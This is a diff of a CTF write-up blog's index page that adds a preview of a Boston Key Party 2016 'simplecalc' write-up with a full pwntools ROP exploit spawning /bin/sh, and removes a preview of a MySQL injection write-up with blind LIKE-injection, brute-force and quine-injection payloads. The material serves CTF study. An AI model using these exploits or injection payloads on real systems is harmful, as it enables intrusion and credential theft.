@@ -131,6 +131,44 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/15/BKP2016-simplecalc-wp/" >Boston Key Part 2016 simplecalc-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-15
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static/bkp16_simplecalc">相关资源</a>  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec simplecalc</span><br><span class="line">[*] <span class="string">&#x27;/Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./simplecalc  </span><br><span class="line">    |<span class="comment">#------------------------------------#|</span></span><br><span class="line">    |         Something Calculator         |</span><br><span class="line">    |<span class="comment">#------------------------------------#|</span></span><br><span class="line"></span><br><span class="line">Expected number of calculations: 50</span><br><span class="line">Options Menu:</span><br><span class="line"> [1] Addition.</span><br><span class="line"> [2] Subtraction.</span><br><span class="line"> [3] Multiplication.</span><br><span class="line"> [4] Division.</span><br><span class="line"> [5] Save and Exit.</span><br><span class="line">=&gt; 1</span><br><span class="line">Integer x: 1</span><br><span class="line">Integer y: 1</span><br><span class="line">Do you really need <span class="built_in">help</span> calculating such small numbers?</span><br><span class="line">Shame on you... Bye</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/14/BKP2016-simplecalc-wp/0x1.png?raw=true" alt="img">  </p>
+<ol>
+<li>可以看到首先获取输入<code>v20</code>，然后进行<code>v20</code>次计算操作，计算结果存入数组<code>v21</code>中</li>
+<li>当选择选项5时，会将<code>v21</code>中的内容全部拷贝到<code>v18</code>中，明显此处存在栈溢出切溢出内容我们可以通过计算结果来控制</li>
+</ol>
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>该文件是静态链接的，但是没有找到库函数<code>system</code>，并且开启了栈不可执行<br><code>ALT+T</code> 查找<code>syscall</code> 发现存在，则可以利用系统调用来实现攻击<br>参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">rdi -&gt; &#x27;/bin/sh&#x27;字符串指针</span><br><span class="line">rsi -&gt; 0</span><br><span class="line">rdx -&gt; 0</span><br><span class="line">rax -&gt; 0x3b</span><br><span class="line">```  </span><br><span class="line">1. 由`ROPgadget`我们可以获取到可用pop指令地址</span><br><span class="line">2. 需要将&#x27;/bin/sh&#x27;写入到数据段中（写在栈上不知道地址，数据段地址固定）  </span><br><span class="line">    * `ROPgadget --binary simplecalc --only &quot;mov|ret&quot;`</span><br><span class="line">    * 刚好有 `0x0000000000400aba : mov qword ptr [rdi], rdx ; ret`</span><br><span class="line">    * 则只要构造pop链将目标地址置入`rdi`，将&#x27;/bin/sh&#x27;置入`rdx`再调用即可</span><br><span class="line">3. 最后构造pop链执行`syscall`</span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">mode = &#x27;&#x27;</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    mode = sys.argv[1]</span><br><span class="line"></span><br><span class="line">proc = process(&quot;./simplecalc&quot;)</span><br><span class="line"></span><br><span class="line">def s(x): proc.send(x)</span><br><span class="line">def sl(x): return proc.sendline(x)</span><br><span class="line">def sd(x): return proc.send(x)</span><br><span class="line">def sla(x, y): return proc.sendlineafter(x, y)</span><br><span class="line">def sa(x, y): return proc.sendafter(x, y)</span><br><span class="line">def ru(x): return proc.recvuntil(x)</span><br><span class="line">def rc(): return proc.recv()</span><br><span class="line">def rl(): return proc.recvline()</span><br><span class="line">def li(con): return log.info(con)</span><br><span class="line">def ls(con): return log.success(con)</span><br><span class="line">def pi(): return proc.interactive()</span><br><span class="line">def pcls(): return proc.close()</span><br><span class="line">def ga(): return u64(ru(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def addSingle(x):</span><br><span class="line">	proc.recvuntil(&quot;=&gt; &quot;)</span><br><span class="line">	proc.sendline(&quot;1&quot;)</span><br><span class="line">	proc.recvuntil(&quot;Integer x: &quot;)</span><br><span class="line">	proc.sendline(&quot;100&quot;)</span><br><span class="line">	proc.recvuntil(&quot;Integer y: &quot;)</span><br><span class="line">	proc.sendline(str(x - 100))  # 注意代码要求任意参与运算的数字都要大于0x27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(z): </span><br><span class="line">    # 注意数组中每个位置为int(dword型)，</span><br><span class="line">    # 64位栈内基本块为qword，因此要分高低32位分别存入</span><br><span class="line">	x = z &amp; 0xffffffff</span><br><span class="line">	y = ((z &amp; 0xffffffff00000000) &gt;&gt; 32) </span><br><span class="line">	addSingle(x)</span><br><span class="line">	addSingle(y)</span><br><span class="line"></span><br><span class="line">gscript = &#x27;&#x27;&#x27;</span><br><span class="line">    b main</span><br><span class="line">    b * 0x401545</span><br><span class="line">    c</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">if mode == &#x27;-d&#x27;:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">rax_ret = 0x44db34</span><br><span class="line">rdx_ret = 0x437a85</span><br><span class="line">rdi_ret = 0x401b73</span><br><span class="line">rsi_ret = 0x401c87</span><br><span class="line">syscall = 0x400488</span><br><span class="line">dest = 0x6C4480</span><br><span class="line">mv_rdx2_prdi = 0x400aba</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># rdi_ret + dest + rdx_ret + b&#x27;/bin/sh\x00&#x27; + mv_rdx2_prdi</span><br><span class="line"># rsi_ret + p64(0) + rdx_ret + p64(0) + rax_ret + p64(0x3b) + syscall</span><br><span class="line">sla(b&#x27;calculations: &#x27;, b&#x27;100&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    # 填满当前栈空间，注意填到v21时最好填0，</span><br><span class="line">    # 因为代码会对v21进行free操作，填其他的可能触发段错误</span><br><span class="line">    add(0)       </span><br><span class="line"></span><br><span class="line">add(rdi_ret)  </span><br><span class="line">add(dest)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(0x0068732f6e69622f)   # /bin/sh</span><br><span class="line"></span><br><span class="line">add(mv_rdx2_prdi)</span><br><span class="line">add(rsi_ret)</span><br><span class="line">add(0)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(0)</span><br><span class="line">add(rax_ret)</span><br><span class="line">add(0x3b)</span><br><span class="line">add(syscall)</span><br><span class="line"></span><br><span class="line">sla(b&#x27;=&gt; &#x27;, b&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2023/08/15/BKP2016-simplecalc-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/10/D3CTF2019-ezupload/" >D3CTF2019-ezupload</a>
 								</h3>
 							</div>
@@ -774,68 +812,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/12/第五空间2021-yasqlin-wp/" >第五空间2021-yet_another_mysql_injection-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-12
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/334">题目链接</a></p>
-<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h3><p>源码提示  ?source&#x3D;1 查看</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?source --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="可见查询语句"><a href="#可见查询语句" class="headerlink" title="可见查询语句"></a>可见查询语句</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>过滤了空格和等号</li>
-<li>查询成功显示<code>wrong password</code> 失败显示 <code>something wrong</code></li>
-</ul>
-<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>可以通过%通配符一位一位爆破</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[post] username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/or/**/password/**/like/**/&#x27;</span>e<span class="operator">%</span><span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">alpha = string.hexdigits</span><br><span class="line">pswd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        post_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;/**/or/**/password/**/like/**/&#x27;<span class="subst">&#123;pswd + i&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">        response = requests.post(<span class="string">&quot;http://node4.anna.nssctf.cn:28624/&quot;</span>, data=post_data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;something&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            pswd += i</span><br><span class="line">            <span class="built_in">print</span>(pswd)</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># eb2d018ac00e7d6dbe8eb7059df0a4b2</span></span><br><span class="line">post_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;pswd&#125;</span>&quot;</span>&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;http://node4.anna.nssctf.cn:28624/&quot;</span>, data=post_data)	<span class="comment"># 登入获取flag</span></span><br><span class="line"><span class="built_in">print</span>(response.text)	</span><br></pre></td></tr></table></figure>
-
-<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><h3 id="dirb后台爆破"><a href="#dirb后台爆破" class="headerlink" title="dirb后台爆破"></a>dirb后台爆破</h3><p>发现phpmyadmin</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; dirb [url]</span><br><span class="line">&lt; </span><br><span class="line">+ http://node4.anna.nssctf.cn:28632/index.php (CODE:200|SIZE:323)              </span><br><span class="line">==&gt; DIRECTORY: http://node4.anna.nssctf.cn:28632/phpmyadmin/</span><br></pre></td></tr></table></figure>
-
-<h3 id="访问phpmyadmin"><a href="#访问phpmyadmin" class="headerlink" title="访问phpmyadmin"></a>访问phpmyadmin</h3><ul>
-<li><p>发现是sql登录界面    弱口令admin admin登录成功</p>
-</li>
-<li><p>查看ctf数据库中users table   获取admin密码</p>
-</li>
-<li><p>登录获取flag</p>
-</li>
-</ul>
-<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><h2 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h2><h3 id="quine注入：sql命令的输入和执行后的输出完全相同，以此通过-row-39-password-39-password"><a href="#quine注入：sql命令的输入和执行后的输出完全相同，以此通过-row-39-password-39-password" class="headerlink" title="quine注入：sql命令的输入和执行后的输出完全相同，以此通过 $row[&#39;password&#39;] === $password"></a>quine注入：sql命令的输入和执行后的输出完全相同，以此通过 <code>$row[&#39;password&#39;] === $password</code></h3><p><a target="_blank" rel="noopener" href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570">从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com)</a></p>
-<p>[Quine Injection](<a target="_blank" rel="noopener" href="https://goodlunatic.github.io/2023/07/04/Quine">https://goodlunatic.github.io/2023/07/04/Quine</a> Injection&#x2F;)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># quine 生成脚本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quine</span>(<span class="params">data, debug=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: <span class="built_in">print</span>(data)</span><br><span class="line">    data = data.replace(<span class="string">&#x27;!!&#x27;</span>,<span class="string">&quot;REPLACE(REPLACE(!!,CHAR(34),CHAR(39)),CHAR(33),!!)&quot;</span>)</span><br><span class="line">    blob = data.replace(<span class="string">&#x27;!!&#x27;</span>,<span class="string">&#x27;&quot;!&quot;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&#x27;!!&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>+blob+<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> debug: <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!填充的东西执行完之后和data一样</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&#x27;/**/union/**/select(!!)#&quot;</span></span><br><span class="line">quine(data)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;/**/union/**/select(REPLACE(REPLACE(&#x27;</span>&quot;/**/union/**/select(REPLACE(REPLACE(&quot;<span class="operator">!</span>&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;<span class="operator">!</span>&quot;))#&#x27;,CHAR(34),CHAR(39)),CHAR(33),&#x27;&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>(REPLACE(REPLACE(&quot;!&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">33</span>),&quot;!&quot;))#<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/12/第五空间2021-yasqlin-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -887,7 +863,7 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>4</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>6</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>7</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -906,48 +882,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li>
 		
 			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>5</span></a></li>
 		
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
+		
 			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>2</span></a></li>
-		
-			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
-		
-			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
-		
-			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
-		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
-		
-			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
 		
 			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>2</span></a></li>
 		
-			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
+			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
+		
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+		
+			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
+		
+			<li><a href="/tags/nightmare/">nightmare<span>1</span></a></li>
+		
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
 		
 			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>39</span></a></li>
+			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
 		
-			<li><a href="/tags/pwn/">pwn<span>10</span></a></li>
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
 		
-			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>1</span></a></li>
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>40</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
 		
 			<li><a href="/tags/upload/">upload<span>5</span></a></li>
 		
-			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
+			<li><a href="/tags/pwn/">pwn<span>11</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>36</span></a></li>
+		   <li><a href="/tags">...<span>39</span></a></li>
 		 
 		</ul>
 	</div>
@@ -958,6 +934,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/08/15/BKP2016-simplecalc-wp/" ><i class="fa fa-file-o"></i>Boston Key Part 2016 simple...</a>
+      </li>
     
       <li>
         <a href="/2023/08/10/D3CTF2019-ezupload/" ><i class="fa fa-file-o"></i>D3CTF2019-ezupload</a>
@@ -973,10 +953,6 @@
     
       <li>
         <a href="/2023/07/17/NISACTF2022-babyupload-wp/" ><i class="fa fa-file-o"></i>NISACTF2022-babyupload-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/07/17/binary-protection/" ><i class="fa fa-file-o"></i>checksec与二进制程序保护机制（含PIE和ASL...</a>
       </li>
     
   </ul>
